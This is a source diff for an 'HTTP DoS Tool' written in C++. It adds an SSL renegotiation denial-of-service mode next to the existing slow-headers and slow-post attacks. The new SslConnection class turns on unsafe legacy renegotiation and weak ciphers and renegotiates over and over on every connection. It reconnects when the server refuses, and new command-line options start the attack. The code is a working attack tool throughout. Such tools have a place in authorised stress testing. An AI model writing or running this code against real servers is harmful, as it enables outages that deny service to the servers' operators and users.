@@ -1,4 +1,4 @@
-// Copyright (c) 2010, PROACTIVE RISK - http://www.proactiverisk.com
+// Copyright (c) 2010-2014, PROACTIVE RISK - http://www.proactiverisk.com
 //
 // This file is part of HTTP DoS Tool.
 //
@@ -7,9 +7,10 @@
 // Software Foundation, either version 3 of the License, or (at your option) any
 // later version.
 //
-// Foobar is distributed in the hope that it will be useful, but WITHOUT ANY
-// WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
-// A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
+// HTTP Dos Tool is distributed in the hope that it will be useful, but WITHOUT
+// ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
+// FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
+// more details.
 //
 // You should have received a copy of the GNU General Public License along with
 // HTTP DoS Tool.  If not, see <http://www.gnu.org/licenses/>.
@@ -26,11 +27,19 @@
 
 #include <sys/types.h>
 #include <signal.h>
-#include <event.h>
 #include <errno.h>
 #include <getopt.h>
 #include <stdint.h>
 #include <unistd.h>
+#include <assert.h>
+
+#include <event2/event.h>
+#include <event2/event_struct.h>
+#include <event2/event_compat.h>
+#include <event2/bufferevent.h>
+#include <event2/bufferevent_ssl.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
 #include <cstdlib>
 #include <cstring>
@@ -69,7 +78,7 @@ struct SocketSetupGuard
   }
 };
 
-void throw_socket_error(const std::string& str)
+std::string socket_error_desc(const std::string& str)
 {
   std::ostringstream oss;
   
@@ -79,7 +88,7 @@ void throw_socket_error(const std::string& str)
 #ifdef PLAT_LINUX
   error = errno;
   
-  oss << "() failed: error " << error;
+  oss << " failed: error " << error;
 
   char errbuf[2048];
   if (strerror_r(error, errbuf, sizeof(errbuf)) == 0) {
@@ -87,10 +96,59 @@ void throw_socket_error(const std::string& str)
   }
 #else
   error = WSAGetLastError();
-  oss << "() failed: error " << error;
+  oss << " failed: error " << error;
 #endif
 
-  throw std::runtime_error(oss.str());
+  return oss.str();
+}
+
+void throw_socket_error(const std::string& str)
+{
+  throw std::runtime_error(socket_error_desc(str));
+}
+
+std::string ssl_error_desc(const std::string &str)
+{
+  std::ostringstream oss;
+  oss << str << ": ";
+
+  while (true) {
+    unsigned long error_code = ERR_get_error();
+    if (error_code == 0)
+      break;
+
+    char err_buf[1024];
+    ERR_error_string_n(error_code, err_buf, sizeof(err_buf));
+
+    oss << err_buf << " ";
+  }
+
+  return oss.str();
+}
+
+void throw_ssl_error(const std::string& str)
+{
+  throw std::runtime_error(ssl_error_desc(str));
+}
+
+std::string ssl_conn_error_desc(SSL *ssl, int ret)
+{
+  int ssl_err = SSL_get_error(ssl, ret);
+
+  if (ssl_err == SSL_ERROR_SSL)
+    return ssl_error_desc("SSL connection error (ssl)");
+  if (ssl_err == SSL_ERROR_SYSCALL) {
+    return socket_error_desc("SSL connection error (syscall)");
+  }
+
+  std::ostringstream oss;
+  oss << "SSL connection error: " << ssl_err;
+  return oss.str();
+}
+
+void throw_ssl_conn_error(SSL *ssl, int ret)
+{
+  throw std::runtime_error(ssl_conn_error_desc(ssl, ret));
 }
 
 struct timeval float_to_timeval(double f)
@@ -135,7 +193,7 @@ struct Options {
   uint16_t      host_port_;   // Network byte order
   std::string   user_agent_;
   enum {
-    RUN_SLOW_HEADERS, RUN_SLOW_POST 
+    RUN_SLOW_HEADERS, RUN_SLOW_POST, RUN_SSL_RENEG
   }             run_;
   int           connections_;
   int           rate_;
@@ -150,6 +208,7 @@ struct Options {
   bool          random_payload_;
   bool          random_post_content_length_;
   bool          random_timeout_;
+  bool          ssl_reconnect_on_failure_;
   std::string   proxy_;
   uint32_t      proxy_addr_;   // Network byte order
   uint16_t      proxy_port_;   // Network byte order
@@ -176,6 +235,7 @@ struct Options {
       random_payload_(false),
       random_post_content_length_(false),
       random_timeout_(false),
+      ssl_reconnect_on_failure_(false),
       proxy_(),
       proxy_addr_(0),
       proxy_port_(htons(80)),
@@ -272,23 +332,31 @@ uint32_t dns_resolve(const std::string& str)
 
 class SlowHeadersHttpConnection;
 
+struct Connection {
+  virtual bool get_logging() = 0;
+  virtual bool get_connected() = 0;
+  virtual ~Connection() {}
+};
+
 class Controller {
 public:
   explicit Controller(const Options& opts);
 
   void report();
   void start_next_connection(void);
-  void report_connection_error(class SlowHeadersHttpConnection* c);
-  void report_connected(class SlowHeadersHttpConnection* c);
+  void report_connection_error(class Connection* c, const std::string& str);
+  void report_connected(class Connection* c);
+  void restart_connection(class Connection *c);
 
   const Options& get_options() const { return opts_; }
   struct event_base* get_event_base() const { return event_base_; }
 
 private:
-  typedef std::set<class SlowHeadersHttpConnection*> ConnectionSet;
+  typedef std::set<class Connection*> ConnectionSet;
 
   static void report_cb(int fd, short what, void* arg);
   static void start_next_connection_cb(int fd, short what, void* arg);
+  void start_new_connection_internal(bool logging);
 
   const Options&  opts_;
   struct event_base *event_base_;
@@ -302,14 +370,22 @@ private:
 
 };
 
-class SlowHeadersHttpConnection {
+struct BufferEventHandler {
+  static void buf_event_read_cb(struct bufferevent* be, void* arg);
+  static void buf_event_write_cb(struct bufferevent* be, void* arg);
+  static void buf_event_event_cb(struct bufferevent* be, short what, void* arg);
+
+  virtual void event_read() = 0;
+  virtual void event_write() = 0;
+  virtual void event_event(int what) = 0;
+};
+
+class SlowHeadersHttpConnection : public BufferEventHandler, public Connection {
 public:
   SlowHeadersHttpConnection(Controller&, bool log);
 
-  void send_partial_get_header();
-  void send_post_header();
-  bool get_logging() const { return logging_; }
-  bool get_connected() const { return connected_; }
+  virtual bool get_logging() { return logging_; }
+  virtual bool get_connected() { return connected_; }
 
 private:
   Controller&                   controller_;
@@ -319,21 +395,63 @@ private:
   bool                          logging_;
   bool                          connected_;
 
-  static void buf_event_read_cb(struct bufferevent* be, void* arg);
-  static void buf_event_write_cb(struct bufferevent* be, void* arg);
-  static void buf_event_event_cb(struct bufferevent* be, short what, void* arg);
   static void send_next_header_part_cb(int, short, void*);
   static void send_next_post_part_cb(int, short, void*);
 
-  void event_read();
-  void event_write();
-  void event_event(int what);
+  virtual void event_read();
+  virtual void event_write();
+  virtual void event_event(int what);
+  void send_partial_get_header();
+  void send_post_header();
   void send_next_header_part();
   void send_next_post_part();
   void schedule_next_send();
   void buf_write(const char* data, size_t size);
   void log_lines(const char* header, const char* data, int size);
 };
+
+class SslConnection : public BufferEventHandler, public Connection {
+public:
+  SslConnection(Controller&, bool log);
+  virtual ~SslConnection();
+
+  static void init_once();
+
+  virtual bool get_logging() { return logging_; }
+  virtual bool get_connected() { return connected_; }
+
+private:
+  Controller&                   controller_;
+  int                           socket_;
+  BufferEventGuard              buf_;
+  bool                          logging_;
+  bool                          connected_;
+  int                           renegotiates_;
+  SSL*                          ssl_;
+  std::auto_ptr<struct event>   event_;
+  static SSL_CTX*               ctx_;
+
+  static void timer_cb(evutil_socket_t sock, short events, void *arg);
+  virtual void event_read();
+  virtual void event_write();
+  virtual void event_event(int what);
+  void timer_event();
+};
+
+void BufferEventHandler::buf_event_read_cb(struct bufferevent* be, void* arg)
+{
+  reinterpret_cast<BufferEventHandler*>(arg)->event_read();
+}
+
+void BufferEventHandler::buf_event_write_cb(struct bufferevent* be, void* arg)
+{
+  reinterpret_cast<BufferEventHandler*>(arg)->event_write();
+}
+
+void BufferEventHandler::buf_event_event_cb(struct bufferevent* be, short what, void* arg)
+{
+  reinterpret_cast<BufferEventHandler*>(arg)->event_event(what);
+}
 
 Controller::Controller(const Options& opts)
   : opts_(opts),
@@ -375,20 +493,37 @@ void Controller::report()
   evtimer_add(report_event_.get(), &timeout);
 }
 
+void Controller::start_new_connection_internal(bool logging)
+{
+  std::auto_ptr<Connection> c;
+
+  switch (get_options().run_) {
+    case Options::RUN_SLOW_HEADERS:
+    case Options::RUN_SLOW_POST:
+      c.reset(new SlowHeadersHttpConnection(*this, logging));
+      break;
+    case Options::RUN_SSL_RENEG:
+      c.reset(new SslConnection(*this, logging));
+      break;
+  }
+
+  connections_.insert(c.release());
+}
+
 void Controller::start_next_connection()
 {
   if (num_connections_started_ < opts_.connections_) {
     num_connections_started_++;
+
+    bool logging = false;
+    if (num_connections_started_ == opts_.log_connection_) {
+      logging = true;
+    }
+
     try {
-      bool logging = false;
-      if (num_connections_started_ == opts_.log_connection_) {
-        logging = true;
-      }
-      SlowHeadersHttpConnection* c = new SlowHeadersHttpConnection(
-          *this, logging);
-      connections_.insert(c);
+      start_new_connection_internal(logging);
     } catch (const std::exception& e) {
-      report_connection_error(NULL);
+      report_connection_error(NULL, e.what());
     }
 
     struct timeval timeout;
@@ -412,14 +547,13 @@ void Controller::start_next_connection()
   }
 }
 
-void Controller::report_connection_error(
-    class SlowHeadersHttpConnection* c)
+void Controller::report_connection_error(Connection* c, const std::string& str)
 {
   if (c) {
     ConnectionSet::iterator i = connections_.find(c);
     if (i != connections_.end()) {
       if (c->get_logging()) {
-        std::cout << "EVENT_DISCONNECTED:" << std::endl;
+        std::cout << "EVENT_DISCONNECTED: " << str << std::endl;
       }
       num_connections_errored_++;
       if (c->get_connected())
@@ -438,7 +572,7 @@ void Controller::report_connection_error(
   }
 }
 
-void Controller::report_connected(class SlowHeadersHttpConnection* c)
+void Controller::report_connected(Connection* c)
 {
   if (c) {
     ConnectionSet::iterator i = connections_.find(c);
@@ -446,6 +580,21 @@ void Controller::report_connected(class SlowHeadersHttpConnection* c)
       num_connections_connected_++;
     }
   }
+}
+
+void Controller::restart_connection(Connection *c)
+{
+  bool logging = c->get_logging();
+  ConnectionSet::iterator i = connections_.find(c);
+  if (i != connections_.end()) {
+    if (c->get_logging()) {
+      std::cout << "EVENT_DISCONNECTED: " << std::endl;
+    }
+    connections_.erase(i);
+    delete c;
+  }
+  
+  start_new_connection_internal(logging);
 }
 
 SlowHeadersHttpConnection::SlowHeadersHttpConnection(Controller& shc, bool log)
@@ -466,9 +615,9 @@ SlowHeadersHttpConnection::SlowHeadersHttpConnection(Controller& shc, bool log)
   }
 
   bufferevent_setcb(buf_.get(),
-      &SlowHeadersHttpConnection::buf_event_read_cb,
-      &SlowHeadersHttpConnection::buf_event_write_cb,
-      &SlowHeadersHttpConnection::buf_event_event_cb,
+      &BufferEventHandler::buf_event_read_cb,
+      &BufferEventHandler::buf_event_write_cb,
+      &BufferEventHandler::buf_event_event_cb,
       this);
   bufferevent_enable(buf_.get(), EV_READ|EV_WRITE);
 
@@ -495,21 +644,6 @@ SlowHeadersHttpConnection::SlowHeadersHttpConnection(Controller& shc, bool log)
     throw std::runtime_error("Got error in bufferevent_socket_new(): should "
         "not fail here.");
   }
-}
-
-void SlowHeadersHttpConnection::buf_event_read_cb(struct bufferevent* be, void* arg)
-{
-  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->event_read();
-}
-
-void SlowHeadersHttpConnection::buf_event_write_cb(struct bufferevent* be, void* arg)
-{
-  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->event_write();
-}
-
-void SlowHeadersHttpConnection::buf_event_event_cb(struct bufferevent* be, short what, void* arg)
-{
-  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->event_event(what);
 }
 
 void SlowHeadersHttpConnection::send_next_header_part_cb(int fd, short what, void* arg)
@@ -548,10 +682,15 @@ void SlowHeadersHttpConnection::event_event(int what)
       std::cout << "EVENT_CONNECTED:" << std::endl;
     }
 
-    if (controller_.get_options().run_ == Options::RUN_SLOW_HEADERS) {
+    switch (controller_.get_options().run_) {
+    case Options::RUN_SLOW_HEADERS:
       send_partial_get_header();
-    } else {
+      break;
+    case Options::RUN_SLOW_POST:
       send_post_header();
+      break;
+    default:
+      assert(0);
     }
   }
 
@@ -561,7 +700,7 @@ void SlowHeadersHttpConnection::event_event(int what)
       event_.reset();
     }
 
-    controller_.report_connection_error(this);
+    controller_.report_connection_error(this, "BEV_EVENT_ERROR|BEV_EVENT_EOF");
   }
 }
 
@@ -728,6 +867,164 @@ void SlowHeadersHttpConnection::send_next_post_part()
 
 // -------------------------------------------------------------------------
 
+SSL_CTX *SslConnection::ctx_;
+  
+SslConnection::SslConnection(Controller& shc, bool log)
+  : controller_(shc), logging_(log), connected_(false), ssl_(NULL),
+    event_(NULL), renegotiates_(0)
+{
+  socket_ = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (socket_ == -1) {
+    throw_socket_error("socket");
+  }
+
+  evutil_make_socket_nonblocking(socket_);
+
+  ssl_ = SSL_new(ctx_);
+  assert(ssl_);  // TODO: guard around ssl_
+
+  buf_.init(bufferevent_openssl_socket_new(controller_.get_event_base(),
+        socket_, ssl_, BUFFEREVENT_SSL_CONNECTING,
+        BEV_OPT_CLOSE_ON_FREE | BEV_OPT_DEFER_CALLBACKS));
+  if (!buf_.get()) {
+    throw std::runtime_error("Could not create new bufferevent: out of "
+        "memory?");
+  }
+
+  bufferevent_setcb(buf_.get(),
+      &BufferEventHandler::buf_event_read_cb,
+      &BufferEventHandler::buf_event_write_cb,
+      &BufferEventHandler::buf_event_event_cb,
+      this);
+  bufferevent_enable(buf_.get(), EV_READ|EV_WRITE);
+
+  const Options& opts = controller_.get_options();
+  struct sockaddr_in addr;
+
+  addr.sin_family       = AF_INET;
+
+  if (opts.proxy_addr_) {
+    addr.sin_addr.s_addr  = opts.proxy_addr_;
+    addr.sin_port         = opts.proxy_port_;
+  } else {
+    addr.sin_addr.s_addr  = opts.host_addr_;
+    addr.sin_port         = opts.host_port_;
+  }
+
+  if (logging_) {
+    std::cout << "EVENT_CONNECTING: " << inet_ntoa(addr.sin_addr)
+      << ":" << ntohs(addr.sin_port) << std::endl;
+  }
+
+  if (bufferevent_socket_connect(buf_.get(),
+        reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) != 0) {
+    throw std::runtime_error("Got error in bufferevent_socket_new(): should "
+        "not fail here.");
+  }
+}
+
+SslConnection::~SslConnection()
+{
+}
+
+void SslConnection::timer_cb(evutil_socket_t sock, short events, void *arg)
+{
+  reinterpret_cast<SslConnection *>(arg)->timer_event();
+}
+
+void SslConnection::init_once()
+{
+  SSL_library_init();
+  SSL_load_error_strings();
+  // SSL_load_crypto_strings();
+  OpenSSL_add_all_algorithms();
+
+  ctx_ = SSL_CTX_new(SSLv23_method());
+  if (!ctx_)
+    throw_ssl_error("SSL_CTX_new failed");
+
+#if 1
+  SSL_CTX_set_options(ctx_, SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);
+  SSL_CTX_set_options(ctx_, SSL_OP_LEGACY_SERVER_CONNECT);
+
+  if (SSL_CTX_set_cipher_list(ctx_, "AES256-SHA:RC4-MD5") == 0)
+    throw_ssl_error("SSL_CTX_set_cipher_list failed");
+#endif
+}
+
+void SslConnection::timer_event()
+{
+}
+
+void SslConnection::event_read()
+{
+  printf("event_read\n");
+}
+
+void SslConnection::event_write()
+{
+  printf("event_write\n");
+}
+
+void SslConnection::event_event(int what)
+{
+  if (what & BEV_EVENT_CONNECTED) {
+    if (!connected_)
+      controller_.report_connected(this);
+    if (connected_)
+      renegotiates_++;
+
+    if (logging_) {
+      if (connected_ && renegotiates_ % 500 == 0)
+        std::cout << "NOTIFY: " << renegotiates_ << " SSL renegotiations" << std::endl;
+      else if (!connected_)
+        std::cout << "EVENT_CONNECTED:" << std::endl;
+    }
+    
+    connected_ = true;
+    
+    bufferevent_ssl_renegotiate(buf_.get());
+  }
+
+  if (what & BEV_EVENT_ERROR) {
+    std::ostringstream oss;
+
+    int sock_err = EVUTIL_SOCKET_ERROR();
+
+    if (sock_err) {
+      oss << "socket_error " << sock_err;
+    }
+
+    bool has_openssl_err = false;
+
+    unsigned long err;
+    while ((err = (bufferevent_get_openssl_error(buf_.get())))) {
+      const char *msg = (const char*)ERR_reason_error_string(err);
+      const char *lib = (const char*)ERR_lib_error_string(err);
+      const char *func = (const char*)ERR_func_error_string(err);
+      if (!has_openssl_err) {
+        oss << " openssl error ";
+        has_openssl_err = true;
+      }
+      oss << msg << " in " << lib << " " << func;
+    }
+
+    if (!sock_err && !has_openssl_err && connected_) {
+      // SSL reneg is probably disabled
+      if (controller_.get_options().ssl_reconnect_on_failure_) {
+        controller_.restart_connection(this);
+        return;
+      }
+    }
+
+    controller_.report_connection_error(this, oss.str());
+  } else if (what & BEV_EVENT_EOF) {
+    controller_.report_connection_error(this, "EOF");
+  }
+}
+
+// -------------------------------------------------------------------------
+
 void version()
 {
   std::cout <<
@@ -754,6 +1051,8 @@ void usage()
 "      Run slow-headers attack.\n"
 "  --slow-post\n"
 "      Run slow-post attack.\n"
+"  --ssl-renegotiation\n"
+"      Run SSL renegotiation attack.\n"
 "  --connections <num>\n"
 "      Number of connections to spawn.\n"
 "  --rate <num>\n"
@@ -806,6 +1105,12 @@ void usage()
 "      then any data will follow. Without this option specified, the data in\n"
 "      the post is sent raw without any prefix.\n"
 "\n"
+"ssl-renegotiate specific options:\n"
+"  --ssl-reconnect-on-failure\n"
+"      If SSL renegotiation is disabled on the server, then sockets will\n"
+"      close on the first renegotiation attempt. If this option is enabled,\n"
+"      then the attack will continue by reconnecting to the server.\n"
+"\n"
 "  --help         : Show this usage statement\n"
 ;
 }
@@ -813,13 +1118,13 @@ void usage()
 void parse_options(Options* opts, int argc, char* argv[])
 {
   enum {
-    OPT_HOST = 1000, OPT_PORT, OPT_SLOW_HEADERS, OPT_SLOW_POST,
+    OPT_HOST = 1000, OPT_PORT, OPT_SLOW_HEADERS, OPT_SLOW_POST, OPT_SSL_RENEG,
     OPT_CONNECTIONS, OPT_RATE, OPT_TIMEOUT, OPT_POST,
     OPT_RANDOM_PATH, OPT_LOG_CONNECTION, OPT_POST_CONTENT_LENGTH,
     OPT_PATH, OPT_REPORT_INTERVAL, OPT_RANDOM_PAYLOAD,
     OPT_RANDOM_POST_CONTENT_LENGTH, OPT_RANDOM_TIMEOUT, OPT_SEED,
     OPT_USER_AGENT, OPT_POST_FIELD, OPT_PROXY, OPT_PROXY_PORT, OPT_STAY_OPEN,
-    OPT_HELP
+    OPT_SSL_RECONNECT_ON_FAILURE, OPT_HELP
   };
 
   static struct option long_options[] = {
@@ -827,6 +1132,7 @@ void parse_options(Options* opts, int argc, char* argv[])
     { "port", 1, 0, OPT_PORT },
     { "slow-headers", 0, 0, OPT_SLOW_HEADERS },
     { "slow-post", 0, 0, OPT_SLOW_POST },
+    { "ssl-renegotiation", 0, 0, OPT_SSL_RENEG },
     { "connections", 1, 0, OPT_CONNECTIONS },
     { "rate", 1, 0, OPT_RATE },
     { "timeout", 1, 0, OPT_TIMEOUT },
@@ -841,6 +1147,7 @@ void parse_options(Options* opts, int argc, char* argv[])
     { "random-timeout", 0, 0, OPT_RANDOM_TIMEOUT },
     { "user-agent", 1, 0, OPT_USER_AGENT },
     { "post-field", 1, 0, OPT_POST_FIELD },
+    { "ssl-reconnect-on-failure", 0, 0, OPT_SSL_RECONNECT_ON_FAILURE },
     { "proxy", 1, 0, OPT_PROXY },
     { "proxy-port", 1, 0, OPT_PROXY_PORT },
     { "seed", 1, 0, OPT_SEED },
@@ -882,6 +1189,7 @@ void parse_options(Options* opts, int argc, char* argv[])
     GENERIC_ARG(OPT_PORT, host_port_, htons(atoi(optarg)));
     GENERIC_ARG(OPT_SLOW_HEADERS, run_, Options::RUN_SLOW_HEADERS);
     GENERIC_ARG(OPT_SLOW_POST, run_, Options::RUN_SLOW_POST);
+    GENERIC_ARG(OPT_SSL_RENEG, run_, Options::RUN_SSL_RENEG);
     INT_ARG(OPT_CONNECTIONS, connections_);
     INT_ARG(OPT_RATE, rate_);
     FLOAT_ARG(OPT_TIMEOUT, timeout_);
@@ -896,6 +1204,7 @@ void parse_options(Options* opts, int argc, char* argv[])
     BOOL_ARG(OPT_RANDOM_TIMEOUT, random_timeout_);
     STRING_ARG(OPT_USER_AGENT, user_agent_);
     STRING_ARG(OPT_POST_FIELD, post_field_);
+    BOOL_ARG(OPT_SSL_RECONNECT_ON_FAILURE, ssl_reconnect_on_failure_);
     HOST_ARG(OPT_PROXY, proxy_, proxy_addr_);
     GENERIC_ARG(OPT_PROXY_PORT, proxy_port_, htons(atoi(optarg)));
     BOOL_ARG(OPT_STAY_OPEN, stay_open_);
@@ -920,6 +1229,8 @@ void parse_options(Options* opts, int argc, char* argv[])
 
 void run(const Options& opts)
 {
+  SslConnection::init_once();
+
   Controller controller(opts);
 
   controller.report();
